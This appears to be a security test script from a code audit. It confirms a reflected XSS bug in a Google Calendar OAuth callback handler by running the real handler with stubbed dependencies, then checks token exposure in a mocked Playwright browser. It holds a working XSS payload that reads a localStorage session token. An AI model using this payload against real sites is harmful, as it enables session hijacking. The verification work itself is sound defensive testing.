// sweep2-sec: reflected XSS in /api/google-cal-callback?error=... (runs the REAL handler, deps stubbed).
import fs from 'fs'; import os from 'os'; import path from 'path';
const V='/home/user/SlickChart/slickchart-vercel';
const t=fs.mkdtempSync(path.join(os.tmpdir(),'s2gc-')); fs.mkdirSync(t+'/api'); fs.mkdirSync(t+'/lib');
fs.copyFileSync(V+'/api/google-cal-callback.js',t+'/api/google-cal-callback.js');
fs.writeFileSync(t+'/package.json','{"type":"module"}');
fs.writeFileSync(t+'/lib/db.js','export function dbEnabled(){return true}');
fs.writeFileSync(t+'/lib/auth.js','export function verifyToken(){return null}\nexport async function sessionFromReq(){return null}\nexport async function sessionOk(){return true}');
fs.writeFileSync(t+'/lib/google-cal.js','export async function ensureGoogleTable(){} export async function exchangeGoogleCode(){} export async function saveGoogleConnection(){} export function googleConfigured(){return true}');
fs.writeFileSync(t+'/api/google-cal.js','export function redirectUri(){return ""}');
const { default: h } = await import(t+'/api/google-cal-callback.js');
const err='<img src=x onerror=window.__PWNED=localStorage.sc_token>';
console.log('payload length',err.length,'(handler slices to 80)');
let body=''; const res={setHeader(){},status(){return this},end(b){body=b}};
await h({query:{error:err}},res);
console.log(body.includes(err)?'CONFIRMED-BUG: ?error= is reflected unescaped into text/html':'SOUND');
try{
  const pw=(await import('/opt/node22/lib/node_modules/playwright/index.js')).default;
  const b=await pw.chromium.launch({executablePath:'/opt/pw-browsers/chromium-1194/chrome-linux/chrome'});
  const p=await b.newPage();
  await p.route('https://slickchart.test/**',r=>r.fulfill({status:200,contentType:'text/html',body:r.request().url().includes('google-cal-callback')?body:'<html></html>'}));
  await p.goto('https://slickchart.test/slickchart'); await p.evaluate(()=>localStorage.setItem('sc_token','VICTIM.TOKEN'));
  await p.goto('https://slickchart.test/api/google-cal-callback?error=x'); await p.waitForTimeout(300);
  console.log('window.__PWNED =',await p.evaluate(()=>window.__PWNED));
  await b.close();
}catch(e){console.log('browser step skipped:',e.message)}
